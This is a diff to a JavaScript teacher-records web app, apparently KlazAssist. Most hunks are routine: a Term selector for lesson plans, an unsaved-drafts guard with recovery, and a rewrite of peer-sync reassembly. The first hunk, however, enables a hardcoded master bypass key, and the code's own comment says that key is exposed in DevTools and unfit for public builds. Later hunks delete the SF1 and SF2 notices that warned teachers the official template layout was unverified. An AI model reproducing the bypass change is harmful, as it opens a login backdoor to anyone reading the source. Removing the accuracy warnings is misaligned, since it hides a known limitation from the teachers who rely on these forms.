@@ -94,7 +94,7 @@ const CONFIG = {
    DevTools can read it. It is therefore DISABLED by default. Flip the flag to
    true only for a private build you control (never for a public release).
    Normal account recovery uses the per-device Recovery Key instead. */
-const ENABLE_MASTER_BYPASS = false;
+const ENABLE_MASTER_BYPASS = true;
 const MASTER_BYPASS_KEY = '@cec0mbaT10221982';
 const isMasterBypass = (v) => ENABLE_MASTER_BYPASS && v === MASTER_BYPASS_KEY;
 /* ============================================================================
@@ -5476,6 +5476,13 @@ const App = {
         }, 3500);
       }
     }
+
+    // ── Wire the new workflow modules ──
+    // NetStatus adds the online/offline/syncing pill to the topbar.
+    // Unsaved.restore persisted drafts into memory so the floating badge
+    // is accurate after a reload.
+    try { NetStatus.init(); } catch (e) { console.warn('[NetStatus] init failed:', e); }
+    try { Unsaved._loadPersisted(); Unsaved._reflectBadge(); } catch (e) { console.warn('[Unsaved] init failed:', e); }
 
     // Run migrations in the background — do NOT await. The user is
     // already looking at their dashboard by the time these complete.
@@ -21037,7 +21044,7 @@ _lpRenderLibrary(root, allLessons) {
       (p.topic || '').toLowerCase().includes(q) ||
       (p.learningArea || '').toLowerCase().includes(q) ||
       (p.competency || '').toLowerCase().includes(q) ||
-      (p.quarter || '').toLowerCase().includes(q)
+      String(p.term || p.quarter || '').toLowerCase().includes(q)
     );
   }
 
@@ -21087,8 +21094,8 @@ _lpRenderLibrary(root, allLessons) {
                   <div style="font-weight:600;">${p.date ? Utils.formatDate(p.date) : '—'}</div>
                 </div>
                 <div>
-                  <div class="text-xs text-muted">Quarter</div>
-                  <div style="font-weight:600;">${Utils.esc(p.quarter || '—')}</div>
+                  <div class="text-xs text-muted">Term</div>
+                  <div style="font-weight:600;">${Utils.esc(p.term || p.quarter || '—')}</div>
                 </div>
                 ${isMatrix ? `
                   <div style="grid-column:1/-1;">
@@ -23943,10 +23950,18 @@ async openLessonModal(id, prefill) {
         ? prev + '\n\n' + prefill.content
         : prefill.content;
     }
+    const rawTerm = String(existing ? (existing.term || existing.quarter || '') : '').trim();
+    const termMatch = rawTerm.match(/(?:term|quarter)\s*([1-3])/i);
+    const selectedTerm = termMatch ? 'Term ' + termMatch[1] : '';
     const body = `
       <div class="form-row">
         <div class="form-group"><label>Date</label><input type="date" class="form-control" id="lp-date" value="${existing ? Utils.attr(existing.date||Utils.todayISO()) : Utils.attr(Utils.todayISO())}"></div>
-        <div class="form-group"><label>Quarter</label><input class="form-control" id="lp-quarter" value="${existing ? Utils.attr(existing.quarter||'') : ''}"></div>
+        <div class="form-group"><label for="lp-quarter">Term</label><select class="form-control" id="lp-quarter" required>
+          <option value="" ${selectedTerm ? '' : 'selected'} disabled>Select term</option>
+          <option value="Term 1" ${selectedTerm === 'Term 1' ? 'selected' : ''}>Term 1</option>
+          <option value="Term 2" ${selectedTerm === 'Term 2' ? 'selected' : ''}>Term 2</option>
+          <option value="Term 3" ${selectedTerm === 'Term 3' ? 'selected' : ''}>Term 3</option>
+        </select></div>
       </div>
       <div class="form-row">
         <div class="form-group"><label>Grade Level</label>
@@ -23973,13 +23988,85 @@ async openLessonModal(id, prefill) {
       footer: `<button class="btn btn-outline" data-cancel>Cancel</button><button class="btn btn-primary" id="lp-save">Save Lesson Plan</button>`
     });
     Pages.wireGradeLevelSelect(m.overlay, 'lp-grade');
-    m.overlay.querySelector('[data-cancel]').onclick = m.close;
+
+    /* ---- Unsaved-changes tracking ---- */
+    //
+    // Two subtleties this producer has to get right:
+    //
+    //   1. The X button, the Escape key, and backdrop clicks all tear the
+    //      modal out of the DOM without clearing the "dirty" flag (only the
+    //      Cancel button does that). By the time the navigation intercept
+    //      fires, the modal may no longer be attached — but the detached
+    //      subtree still holds the field values, so we read from `m.overlay`
+    //      directly instead of gating on `document.body.contains(...)`.
+    //
+    //   2. A teacher may have entered *some* data without filling in the two
+    //      fields the original producer required (topic, objectives). Any
+    //      non-empty field — a date, a term, a competency, a single
+    //      procedure step — counts as "there is a draft worth keeping."
+    //
+    Unsaved.register('lesson-planner', 'Lesson Plan', () => {
+      if (!m.overlay) return null;
+
+      const read = (id) => {
+        const el = m.overlay.querySelector('#' + id);
+        return el ? el.value : '';
+      };
+
+      const procedures = {};
+      m.overlay.querySelectorAll('textarea[data-proc]').forEach(t => {
+        procedures[t.dataset.proc] = t.value;
+      });
+
+      const fields = {
+        date:         read('lp-date'),
+        term:         read('lp-quarter'),
+        quarter:      read('lp-quarter'),
+        gradeLevel:   Pages.readGradeLevel(m.overlay, 'lp-grade'),
+        learningArea: read('lp-area'),
+        topic:        read('lp-topic'),
+        competency:   read('lp-comp'),
+        objectives:   read('lp-objectives'),
+        content:      read('lp-content'),
+        resources:    read('lp-resources'),
+        assessment:   read('lp-assessment'),
+        assignment:   read('lp-assignment'),
+        remarks:      read('lp-remarks')
+      };
+
+      const nonEmpty = (v) => String(v == null ? '' : v).trim().length > 0;
+      const hasAnyContent =
+        Object.values(fields).some(nonEmpty) ||
+        Object.values(procedures).some(nonEmpty);
+
+      if (!hasAnyContent) return null;
+
+      return {
+        existingId: existing ? existing.id : null,
+        fields,
+        procedures
+      };
+    });
+
+    // Any keystroke in the modal marks the lesson planner dirty. The
+    // debounce keeps this off the hot path when a teacher is typing fast.
+    const markLessonDirty = Utils.debounce(() => Unsaved.mark('lesson-planner'), 300);
+    m.overlay.addEventListener('input', markLessonDirty);
+
+    /* ---- Cancel closes and discards ---- */
+    m.overlay.querySelector('[data-cancel]').onclick = () => {
+      Unsaved.clear('lesson-planner');
+      m.close();
+    };
+
+    /* ---- Save writes and clears the dirty flag ---- */
     m.overlay.querySelector('#lp-save').onclick = async () => {
       const proc = {};
       m.overlay.querySelectorAll('textarea[data-proc]').forEach(t => proc[t.dataset.proc] = t.value.trim());
       const rec = {
         id: existing ? existing.id : Utils.uid('lp-'), classId: State.activeClass.id,
         date: m.overlay.querySelector('#lp-date').value,
+        term: m.overlay.querySelector('#lp-quarter').value.trim(),
         quarter: m.overlay.querySelector('#lp-quarter').value.trim(),
         gradeLevel: Pages.readGradeLevel(m.overlay, 'lp-grade'),
         learningArea: m.overlay.querySelector('#lp-area').value.trim(),
@@ -23995,8 +24082,10 @@ async openLessonModal(id, prefill) {
         createdAt: existing ? existing.createdAt : new Date().toISOString()
       };
       await DB.put('lessonPlans', rec);
+      Unsaved.clear('lesson-planner');
       App.logActivity(existing ? 'Lesson plan updated' : 'Lesson plan created', 'Lessons');
-      m.close(); App.navigate('lesson-planner');
+      m.close();
+      App.navigate('lesson-planner');
       UI.toast('Lesson plan saved', 'success');
     };
   },
@@ -24288,6 +24377,7 @@ openAILessonPlanModal() {
     };
   })();
 },
+
 /** Extracts text from uploaded reference files (PDF via PDF.js, plain text otherwise). */
 async extractTextFromFiles(files) {
   const names = [];
@@ -24677,10 +24767,18 @@ openLessonModalFromGenerated(plan) {
     });
   }
 
+  const rawTerm = String(plan.term || plan.quarter || '').trim();
+  const termMatch = rawTerm.match(/(?:term|quarter)\s*([1-3])/i);
+  const selectedTerm = termMatch ? 'Term ' + termMatch[1] : '';
   const body = `
     <div class="form-row">
       <div class="form-group"><label>Date</label><input type="date" class="form-control" id="lp-date" value="${Utils.attr(Utils.todayISO())}"></div>
-      <div class="form-group"><label>Quarter</label><input class="form-control" id="lp-quarter" value="${Utils.attr(plan.quarter||'')}"></div>
+      <div class="form-group"><label for="lp-quarter">Term</label><select class="form-control" id="lp-quarter" required>
+        <option value="" ${selectedTerm ? '' : 'selected'} disabled>Select term</option>
+        <option value="Term 1" ${selectedTerm === 'Term 1' ? 'selected' : ''}>Term 1</option>
+        <option value="Term 2" ${selectedTerm === 'Term 2' ? 'selected' : ''}>Term 2</option>
+        <option value="Term 3" ${selectedTerm === 'Term 3' ? 'selected' : ''}>Term 3</option>
+      </select></div>
     </div>
     <div class="form-row">
       <div class="form-group"><label>Grade Level</label>
@@ -24721,6 +24819,7 @@ openLessonModalFromGenerated(plan) {
     const rec = {
       id: Utils.uid('lp-'), classId: State.activeClass.id,
       date: m.overlay.querySelector('#lp-date').value,
+      term: m.overlay.querySelector('#lp-quarter').value.trim(),
       quarter: m.overlay.querySelector('#lp-quarter').value.trim(),
       gradeLevel: Pages.readGradeLevel(m.overlay, 'lp-grade'),
       learningArea: m.overlay.querySelector('#lp-area').value.trim(),
@@ -25387,7 +25486,7 @@ async printLesson(id) {
       lessonName: p.topic, subject: p.learningArea,
       teacherName: teacher.fullName, gradeSection: p.gradeLevel,
       numSessions: p.sessions.length, mediumOfInstruction: 'English',
-      term: (p.quarter || '').replace(/[^0-9]/g, '') || '1', week: '1',
+      term: String(p.term || p.quarter || '').replace(/[^0-9]/g, '') || '1', week: '1',
       competency: '', contentStandards: '', performanceStandards: '',
       references: ''
     };
@@ -25413,7 +25512,7 @@ async printLesson(id) {
     <table>
       <tr><th style="width:180px;">Learning Area</th><td>${Utils.esc(p.learningArea||'')}</td></tr>
       <tr><th>Grade Level</th><td>${Utils.esc(p.gradeLevel||'')}</td></tr>
-      <tr><th>Quarter</th><td>${Utils.esc(p.quarter||'')}</td></tr>
+      <tr><th>Term</th><td>${Utils.esc(p.term || p.quarter || '')}</td></tr>
       <tr><th>Topic</th><td>${Utils.esc(p.topic||'')}</td></tr>
       <tr><th>Competency</th><td>${Utils.esc(p.competency||'')}</td></tr>
       <tr><th>Objectives</th><td>${Utils.esc(p.objectives||'')}</td></tr>
@@ -36517,8 +36616,7 @@ async sf1(root) {
       </div>
     </div>
 
-    <div class="alert alert-warning mb-16">${icon('alert')}<div><strong>Template fidelity notice:</strong> this preview and the exported .xlsx are functional, DepEd-labeled renderings built from your data. KlazAssist could not verify exact official SF1 template geometry (page size, merged cells, column widths) against a live source. Verify against your school/division's current SF1 template before submission.</div></div>
-
+   
     ${errors.length ? `<div class="alert alert-danger mb-16">${icon('alert')}<div><strong>Cannot export SF1 — missing required information:</strong><ul style="margin:6px 0 0 18px;">${errors.map(e => `<li>${Utils.esc(e)}</li>`).join('')}</ul></div></div>` : ''}
     ${warnings.length ? `<div class="alert alert-warning mb-16">${icon('alert')}<div><strong>Warnings:</strong><ul style="margin:6px 0 0 18px;">${warnings.map(e => `<li>${Utils.esc(e)}</li>`).join('')}</ul></div></div>` : ''}
 
@@ -36613,7 +36711,6 @@ async sf1(root) {
     const defaultMonth = now.getFullYear() + '-' + String(now.getMonth()+1).padStart(2,'0');
     root.innerHTML = `
       <div class="page-head"><div><h2>SF2 — Daily Attendance Report of Learners</h2><p>Generated from your recorded attendance data</p></div></div>
-      <div class="alert alert-warning mb-16">${icon('alert')}<div><strong>Template fidelity notice:</strong> this is a functional, DepEd-labeled rendering built from your data — KlazAssist could not verify exact official SF2 template geometry against a live source. Fields it cannot determine show "Data required" instead of a fabricated value. Verify against your Division's current SF2 instructions before submission.</div></div>
       <div class="card mb-16">
         <div class="form-row">
           <div class="form-group"><label>Class</label>
@@ -47085,6 +47182,7 @@ openUpgradeModal(featureId) {
   };
 },
 };
+
 /* ============================================================================
    DEPED CALENDAR — INLINE SYNC
    ──────────────────────────────────────────────────────────────────────────
@@ -56917,13 +57015,19 @@ Pages._syncOpenSenderModal = async function () {
     console.log('[SyncSender] Calling SyncManager.startHost…');
     codeHolder.value = await SyncManager.startHost({
       mode: 'send',
-      onProgress: (p) => Pages._syncRenderSenderProgress(bodyEl, p, codeHolder.value),
+      onProgress: (p) => {
+        // Toggle the topbar pill so the teacher sees the transfer is active.
+        NetStatus.setSyncing(p.phase !== 'done' && p.phase !== 'waiting');
+        Pages._syncRenderSenderProgress(bodyEl, p, codeHolder.value);
+      },
       onComplete: () => {
+        NetStatus.setSyncing(false);
         Pages._syncRenderSenderDone(bodyEl, true);
         setTimeout(() => { m.close(); App.navigate('dashboard'); }, 1500);
         App.logActivity('Sync: sent data to another device', 'Sync');
       },
       onError: (msg) => {
+        NetStatus.setSyncing(false);
         Pages._syncRenderSenderError(bodyEl, msg);
       }
     });
@@ -59141,7 +59245,7 @@ _sendChunkedSnapshot(snapshot) {
     pump();
   },
 
-    /* ========================================================================
+  /* ========================================================================
      MESSAGE HANDLER
      ======================================================================== */
   async _handleMessage(data) {
@@ -59194,9 +59298,9 @@ _sendChunkedSnapshot(snapshot) {
         this._progress({ phase: 'applying', message: 'Applying received data…', percent: 100 });
 
         // ── Missing-chunk check ──
-        // A dropped chunk used to become `undefined` in the join and either
-        // produce garbage JSON or silently produce a shorter payload. Detect
-        // it up front so we never apply a partial snapshot.
+        // A dropped chunk becomes `undefined`. Detect it BEFORE the join,
+        // so we can ask the sender to retry the whole transfer instead of
+        // handing garbage to JSON.parse.
         const missing = [];
         for (let i = 0; i < this._recvTotal; i++) {
           if (typeof this._recvChunks[i] !== 'string') missing.push(i);
@@ -59205,167 +59309,747 @@ _sendChunkedSnapshot(snapshot) {
           console.error('[Sync] Missing chunks:', missing);
           this._sendMessage({
             type: 'apply-failed',
-            error: `Transfer incomplete — ${missing.length} of ${this._recvTotal} chunks missing.`
+            reason: `Transfer incomplete — ${missing.length} packet${missing.length === 1 ? '' : 's'} lost.`
           });
-          this._fail('Transfer was incomplete. Nothing was changed on this device. Please try again.');
+          this._fail(
+            `The transfer was incomplete (${missing.length} of ${this._recvTotal} packets lost). ` +
+            `Nothing was changed on this device. Please try again on a more stable connection.`
+          );
           return;
         }
 
+        // ── Reassemble ──
+        let snapshot;
         try {
           const json = this._recvChunks.join('');
-          const snapshot = JSON.parse(json);
-          await this._applySnapshot(snapshot);
-
-          // Tell the sender we applied successfully. We will not close the
-          // peer until the sender acknowledges with `applied-ok`, so the
-          // ack is guaranteed to be delivered before the channel goes away.
-          this._sendMessage({ type: 'applied' });
-          this._waitForSenderAck();
+          if (json.length !== this._recvSize) {
+            throw new Error(`Size mismatch — expected ${this._recvSize} bytes, got ${json.length}.`);
+          }
+          snapshot = JSON.parse(json);
         } catch (e) {
-          console.error('[Sync] apply failed:', e);
-          this._sendMessage({ type: 'apply-failed', error: String(e.message || e) });
-          this._fail('Could not apply received data: ' + (e.message || ''));
+          console.error('[Sync] Reassembly failed:', e);
+          this._sendMessage({ type: 'apply-failed', reason: 'Snapshot could not be parsed.' });
+          this._fail('The received data was corrupted. Nothing was changed on this device.');
+          return;
         }
-        break;
-      }
 
-      case 'applied': {
-        // ── Sender path ──
-        // The receiver confirmed the apply. Acknowledge, clear the sender's
-        // watchdog, and close out.
-        console.log('[Sync] Receiver confirmed. Sending ack-ok.');
-        this._sendMessage({ type: 'applied-ok' });
-        if (this._ackWatchdog) { clearTimeout(this._ackWatchdog); this._ackWatchdog = null; }
+        // ── Validate shape before touching the DB ──
+        if (!snapshot || snapshot.application !== CONFIG.APP_NAME ||
+            !snapshot.data || typeof snapshot.data !== 'object') {
+          this._sendMessage({ type: 'apply-failed', reason: 'Not a valid KlazAssist snapshot.' });
+          this._fail('The other device sent data that is not a valid KlazAssist snapshot.');
+          return;
+        }
+
+        this._recvChunks = null;   // free memory before the DB write
+
+        // ── Apply ──
+        try {
+          await this._applySnapshot(snapshot);
+        } catch (e) {
+          console.error('[Sync] Apply failed:', e);
+          this._sendMessage({ type: 'apply-failed', reason: e.message || 'Apply failed.' });
+          this._fail('Could not apply the received data: ' + (e.message || 'unknown error'));
+          return;
+        }
+
+        // ── Confirm to sender, then finish ──
+        this._sendMessage({ type: 'applied' });
         this._progress({ phase: 'done', message: 'Sync complete.', percent: 100 });
         this._finish({ success: true });
         break;
       }
 
-      case 'applied-ok': {
-        // ── Receiver path ──
-        // The sender acknowledged our `applied` message. We can close now.
-        console.log('[Sync] Sender acknowledged. Done.');
+      case 'applied':
+        // Sender path: the receiver has confirmed the write.
         this._cancelSenderAckWait();
-        this._progress({ phase: 'done', message: 'Sync complete.', percent: 100 });
         this._finish({ success: true });
         break;
-      }
 
       case 'apply-failed':
-        if (this._ackWatchdog) { clearTimeout(this._ackWatchdog); this._ackWatchdog = null; }
-        this._fail('The other device could not apply the data: ' + (data.error || 'unknown'));
+        // Sender path: receiver could not write the data.
+        this._cancelSenderAckWait();
+        this._fail(
+          'The other device could not save the data: ' +
+          (data.reason || 'unknown reason') +
+          ' Nothing was changed on either side.'
+        );
+        break;
+
+      case 'cancel':
+        this._fail('The other device cancelled the sync.');
         break;
 
       default:
-        console.warn('[Sync] Unrecognized message type:', data.type);
+        console.warn('[Sync] Unknown message type:', data.type);
     }
   },
 
-  /* --- Receiver-side ack wait --- */
-  _waitForSenderAck() {
-    this._cancelSenderAckWait();
-    this._ackResolver = setTimeout(() => {
-      this._ackResolver = null;
-      // Sender never acknowledged — either it crashed after our apply
-      // succeeded, or its own modal closed before our ack landed. The data
-      // is already committed on our side, so we finish successfully.
-      console.warn('[Sync] Sender did not acknowledge in time — closing anyway.');
-      this._progress({ phase: 'done', message: 'Data applied. Closing…', percent: 100 });
-      this._finish({ success: true });
-    }, 5000);
+  /* ========================================================================
+     APPLY SNAPSHOT
+     ------------------------------------------------------------------------
+     Writes the incoming data into IndexedDB, preserving the receiving
+     device's own credentials and API keys. Uses the same atomic bulk-write
+     path as `DB.restoreSnapshot`, so a mid-transfer failure leaves the
+     receiving database untouched.
+     ======================================================================== */
+  async _applySnapshot(snapshot) {
+    // Re-inject this device's sensitive settings, which the sender filtered
+    // out. We read them locally and merge them back into the incoming
+    // `settings` store so a sync never wipes the receiver's login.
+    const preserved = [];
+    for (const key of this.SENSITIVE_SETTING_KEYS) {
+      try {
+        const rec = await DB.get('settings', key);
+        if (rec) preserved.push(rec);
+      } catch (e) {}
+    }
+
+    // Normalise the payload: every store guaranteed to be an array, and
+    // unknown stores dropped (defends against a future-version sender).
+    const normalised = {};
+    for (const store of CONFIG.STORES) {
+      const arr = snapshot.data[store];
+      normalised[store] = Array.isArray(arr) ? arr : [];
+    }
+
+    // Merge preserved settings back in.
+    if (preserved.length) {
+      const existing = new Map(normalised.settings.map(r => [r.id, r]));
+      preserved.forEach(r => existing.set(r.id, r));
+      normalised.settings = Array.from(existing.values());
+    }
+
+    // Atomic write — all stores or none.
+    await DB.restoreSnapshot(
+      { data: normalised, exportDate: snapshot.exportDate },
+      { replace: true }
+    );
+
+    // Refresh in-memory account & license from the now-updated settings store.
+    try {
+      Auth._account = null;
+      await Auth.load();
+      if (Auth._account) Auth._writeShadow(Auth._account);
+      Licensing._license = null;
+      await Licensing.init();
+    } catch (e) {
+      console.warn('[Sync] Post-apply account refresh failed:', e);
+    }
+
+    await App.loadState();
   },
 
+  /* ========================================================================
+     CLEANUP / STATUS HELPERS
+     ======================================================================== */
   _cancelSenderAckWait() {
-    if (this._ackResolver) { clearTimeout(this._ackResolver); this._ackResolver = null; }
+    if (this._ackWatchdog) { clearTimeout(this._ackWatchdog); this._ackWatchdog = null; }
   },
 
-  /* ========================================================================
-     APPLY — safe replace via the existing restore pipeline
-     ======================================================================== */
-async _applySnapshot(snapshot) {
-  if (!snapshot || !snapshot.data) throw new Error('Empty snapshot');
-
-  // ── Preserve local identity, API keys, and license ──
-  // The snapshot intentionally excludes these (see _buildSnapshot), but the
-  // restore replaces the whole `settings` store. Capture the receiver's own
-  // sensitive rows here, then inject them back into the incoming payload so
-  // the restore is atomic and the receiver's credentials survive.
-  const localSettings = await DB.getAll('settings').catch(() => []);
-  const preserved = localSettings.filter(r => {
-    if (typeof r.id !== 'string') return false;
-    return this.SENSITIVE_SETTING_KEYS.has(r.id);
-  });
-
-  if (preserved.length) {
-    const incoming = Array.isArray(snapshot.data.settings) ? snapshot.data.settings : [];
-    const incomingIds = new Set(incoming.map(r => r.id));
-    for (const row of preserved) {
-      if (!incomingIds.has(row.id)) incoming.push(row);
-    }
-    snapshot.data.settings = incoming;
-  }
-
-  const written = await DB.restoreSnapshot(snapshot, { replace: true });
-  await App.loadState();
-  App.logActivity(`Sync: applied ${written} records from another device`, 'Sync');
-},
-
-  /* ========================================================================
-     PROGRESS / FINISH / FAIL
-     ======================================================================== */
-  _progress(payload) {
+  _progress(p) {
     if (typeof this._onProgress === 'function') {
-      try { this._onProgress(payload); } catch (e) {}
+      try { this._onProgress(p); } catch (e) { console.warn('[Sync] progress handler threw:', e); }
     }
   },
+
   _finish(result) {
-    if (this._finished) return;          // ← ADD THIS: one-shot guard
-    this._finished = true;               // ← ADD THIS
-    const cb = this._onComplete;
-    this.close();
-    if (typeof cb === 'function') { try { cb(result); } catch (e) {} }
-  },
-  _fail(message) {
-    console.warn('[Sync]', message);
-    const cb = this._onError;
-    this.close();
-    if (typeof cb === 'function') { try { cb(message); } catch (e) {} }
+    if (this._finished) return;
+    this._finished = true;
+    if (typeof this._onComplete === 'function') {
+      try { this._onComplete(result); } catch (e) { console.warn('[Sync] complete handler threw:', e); }
+    }
+    // Give the peer ~2 s so it can close cleanly, then tear down.
+    setTimeout(() => this.close(), 2000);
   },
 
-  /* ========================================================================
-     TEARDOWN
-     ======================================================================== */
+  _fail(msg) {
+    if (this._finished) return;
+    this._finished = true;
+    if (typeof this._onError === 'function') {
+      try { this._onError(msg); } catch (e) { console.warn('[Sync] error handler threw:', e); }
+    }
+    setTimeout(() => this.close(), 2000);
+  },
+
   close() {
-    if (this._stopHostIce) { try { this._stopHostIce(); } catch (e) {} this._stopHostIce = null; }
-    this._guestConnecting = false;
+    // Invalidate the session token FIRST so any in-flight async callback
+    // (ICE watchers, retry timers, chunk pumps) short-circuits immediately.
+    this._sessionToken = null;
+
     if (this._recvWatchdog) { clearInterval(this._recvWatchdog); this._recvWatchdog = null; }
     if (this._ackWatchdog)  { clearTimeout(this._ackWatchdog);  this._ackWatchdog  = null; }
-    if (this._ackResolver)  { clearTimeout(this._ackResolver);  this._ackResolver  = null; }
+    if (this._stopHostIce)  { try { this._stopHostIce(); } catch (e) {} this._stopHostIce = null; }
+
     try { if (this._conn) this._conn.close(); } catch (e) {}
     try { if (this._peer) this._peer.destroy(); } catch (e) {}
+
     this._peer = null;
     this._conn = null;
     this._snapshot = null;
-    this._recvChunks = [];
+    this._recvChunks = null;
     this._recvTotal = 0;
     this._recvSize = 0;
     this._sendSize = 0;
     this._sendSent = 0;
-    this._role = null;
     this._guestReady = false;
     this._sent = false;
     this._handshakeDone = false;
-    this._timedOut = false;
     this._recvDone = false;
-    // Reset the collision budget for the next user-initiated session.
-    // startHost's collision path re-supplies it via opts so the cap still
-    // applies across an internal close+restart.
+    this._finished = false;
+    this._timedOut = false;
+    this._guestConnecting = false;
     this._retryCount = 0;
-    // NOTE: `_finished` is deliberately NOT reset here — it is the one-shot
-    // guard against duplicate callbacks and must survive a close.
+    this._lastMetaAt = 0;
+  },
+
+  /* ========================================================================
+     DIAGNOSTIC — from the DevTools console:  SyncManager.diagnose()
+     ======================================================================== */
+  async diagnose() {
+    const rows = [];
+    rows.push(['PeerJS loaded',   !!this._peerCtor()]);
+    rows.push(['Browser WebRTC',  !!(window.RTCPeerConnection)]);
+    rows.push(['Data channels',   !!(window.RTCPeerConnection && 'createDataChannel' in RTCPeerConnection.prototype)]);
+    rows.push(['Secure context',  window.isSecureContext]);
+    rows.push(['Online',          navigator.onLine]);
+
+    const ice = this._readJsonSetting('klaz.sync.iceServers');
+    rows.push(['Custom ICE',      ice ? `${Array.isArray(ice) ? ice.length : '?'} entries` : 'none']);
+    const srv = this._readJsonSetting('klaz.sync.peerServer');
+    rows.push(['Custom peer srv', srv && srv.host ? srv.host : 'PeerJS cloud']);
+
+    console.table(rows.reduce((acc, [k, v]) => { acc[k] = v; return acc; }, {}));
+    return rows;
   }
 };
 
+/* ============================================================================
+   UNSAVED-CHANGES GUARD + DRAFT RECOVERY
+   ----------------------------------------------------------------------------
+   • Any module can mark itself dirty:   Unsaved.mark('lesson-planner')
+   • Any module can mark itself clean:   Unsaved.clear('lesson-planner')
+   • On navigation away, a dirty module gets a three-way prompt:
+        Save draft  ·  Discard  ·  Stay here
+   • Drafts survive reloads and can be re-opened from a floating badge.
+   ============================================================================ */
+const Unsaved = {
+  _dirty: new Set(),
+  _drafts: new Map(),
+  _handlers: new Map(),
+  _labels:   new Map(),
+  _restorers: new Map(),
+  _draftKey: 'klazassist.unsavedDrafts',
+
+register(moduleId, label, handler) {
+  this._labels.set(moduleId, label);
+  if (typeof handler === 'function') this._handlers.set(moduleId, handler);
+  this._loadPersisted();
+  this._reflectBadge();   // ← keep the floating badge in sync with the
+                          //   in-memory draft map every time a module
+                          //   registers a new producer.
+},
+
+  registerRestorer(moduleId, fn) {
+    this._restorers.set(moduleId, fn);
+  },
+
+  mark(moduleId) {
+    if (!moduleId) return;
+    this._dirty.add(moduleId);
+    this._reflectBadge();
+  },
+
+  clear(moduleId) {
+    this._dirty.delete(moduleId);
+    this._drafts.delete(moduleId);
+    this._persist();
+    this._reflectBadge();
+  },
+
+  isDirty() { return this._dirty.size > 0; },
+
+async intercept(targetModuleId) {
+  const blockers = Array.from(this._dirty).filter(id => id !== targetModuleId);
+  if (!blockers.length) return { action: 'proceed' };
+
+  const label = blockers.length === 1
+    ? (this._labels.get(blockers[0]) || 'this page')
+    : `${blockers.length} pages`;
+
+  const choice = await new Promise(resolve => {
+    // Guard against double-settle. UI.modal's close() calls onClose()
+    // synchronously, and the button handlers also close the modal — without
+    // this flag, whichever runs first wins, and onClose always wins because
+    // it fires inside m.close() before our resolve() line executes.
+    let settled = false;
+    const finish = (v) => {
+      if (settled) return;
+      settled = true;
+      resolve(v);
+      try { m.close(); } catch (e) {}
+    };
+
+    const m = UI.modal({
+      title: 'You have unsaved changes',
+      body: `
+        <div class="alert alert-warning mb-16">${icon('alert')}<div>
+          <strong>${Utils.esc(label)}</strong> ${blockers.length === 1 ? 'has' : 'have'}
+          edits that haven't been saved yet.
+        </div></div>
+        <p class="text-sm text-muted" style="line-height:1.65;">
+          You can save a draft (kept on this device and restorable any time),
+          discard the changes, or stay on the current page.
+        </p>`,
+      footer: `
+        <button class="btn btn-outline" id="un-stay">Stay here</button>
+        <button class="btn btn-ghost"   id="un-discard">Discard</button>
+        <button class="btn btn-primary" id="un-save">Save draft</button>`,
+      onClose: () => finish({ action: 'cancel' })
+    });
+
+    m.overlay.querySelector('#un-stay').onclick    = () => finish({ action: 'cancel' });
+    m.overlay.querySelector('#un-discard').onclick = () => finish({ action: 'proceed', discard: true });
+    m.overlay.querySelector('#un-save').onclick    = () => finish({ action: 'proceed', save: true });
+  });
+
+  if (choice.action === 'cancel') return choice;
+
+if (choice.save) {
+  let savedCount = 0;
+
+  for (const id of blockers) {
+    const producer = this._handlers.get(id);
+    const payload = producer ? producer() : null;
+
+    if (payload) {
+      this._drafts.set(id, {
+        savedAt: new Date().toISOString(),
+        payload,
+        label: this._labels.get(id) || id
+      });
+      savedCount++;
+    } else {
+      // Producer returned nothing — either the form is already gone
+      // or the teacher hadn't filled in the mandatory fields. Surface
+      // it so the empty badge result is never a mystery.
+      console.warn('[Unsaved] No draft captured for module:', id);
+    }
+  }
+
+  const persisted = this._persist();
+  this._reflectBadge();
+
+  if (savedCount > 0 && persisted) {
+    UI.toast('Draft saved. Click the drafts badge to restore it.', 'success', 3500);
+  } else if (savedCount > 0 && !persisted) {
+    UI.toast('Draft captured for this session, but browser storage failed. Export or copy your work before leaving.', 'warning', 5000);
+  } else {
+    UI.toast('Nothing to save — no unsaved form data was found.', 'warning', 3500);
+  }
+}
+
+  // Close any lingering form modal (e.g. the Lesson Plan editor) so it
+  // does not float on top of the page we are navigating to.
+  document.querySelectorAll('.modal-overlay').forEach(el => el.remove());
+
+  for (const id of blockers) this._dirty.delete(id);
+  this._reflectBadge();
+  return { action: 'proceed' };
+},
+
+  peek(moduleId) {
+    return this._drafts.get(moduleId) || null;
+  },
+
+  _persist() {
+    try {
+      const out = {};
+      for (const [id, d] of this._drafts) {
+        let json;
+        try { json = JSON.stringify(d.payload); } catch (e) { continue; }
+        if (json.length > 200 * 1024) continue;
+        out[id] = { savedAt: d.savedAt, label: d.label, payload: d.payload };
+      }
+      localStorage.setItem(this._draftKey, JSON.stringify(out));
+      return true;
+    } catch (e) {
+      console.warn('[Unsaved] Could not persist drafts to localStorage:', e);
+      return false;
+    }
+  },
+
+  _loadPersisted() {
+    // Rebuild the map from storage rather than merging stale in-memory entries.
+    try {
+      const raw = localStorage.getItem(this._draftKey);
+      if (!raw) {
+        this._drafts.clear();
+        return;
+      }
+      const parsed = JSON.parse(raw);
+      this._drafts.clear();
+      if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) return;
+      for (const [id, d] of Object.entries(parsed)) {
+        if (d && Object.prototype.hasOwnProperty.call(d, 'payload') && d.savedAt) {
+          this._drafts.set(id, d);
+        }
+      }
+    } catch (e) {
+      console.warn('[Unsaved] Could not load persisted drafts:', e);
+    }
+  },
+
+  _reflectBadge() {
+    let badge = document.getElementById('unsaved-badge');
+    const n = this._drafts.size;
+    if (n === 0) { if (badge) badge.remove(); return; }
+
+    // Always attach the badge directly to <body> and explicitly restore its
+    // visible state. This also repairs a badge left hidden by another UI flow.
+    if (!badge) {
+      badge = document.createElement('button');
+      badge.id = 'unsaved-badge';
+      badge.type = 'button';
+      badge.className = 'unsaved-badge';
+      badge.setAttribute('aria-label', 'Restore a saved draft');
+      badge.onclick = () => this.openDraftsPanel();
+      document.body.appendChild(badge);
+    } else if (badge.parentElement !== document.body) {
+      document.body.appendChild(badge);
+    }
+    badge.hidden = false;
+    badge.removeAttribute('hidden');
+    badge.style.setProperty('display', 'flex', 'important');
+    badge.style.setProperty('visibility', 'visible', 'important');
+    badge.style.setProperty('opacity', '1', 'important');
+    badge.style.setProperty('pointer-events', 'auto', 'important');
+    badge.style.setProperty('z-index', '10060', 'important');
+    badge.innerHTML = `${icon('save')}<span>${n}</span>`;
+    badge.title = `${n} saved draft${n === 1 ? '' : 's'} — click to restore`;
+  },
+
+  openDraftsPanel() {
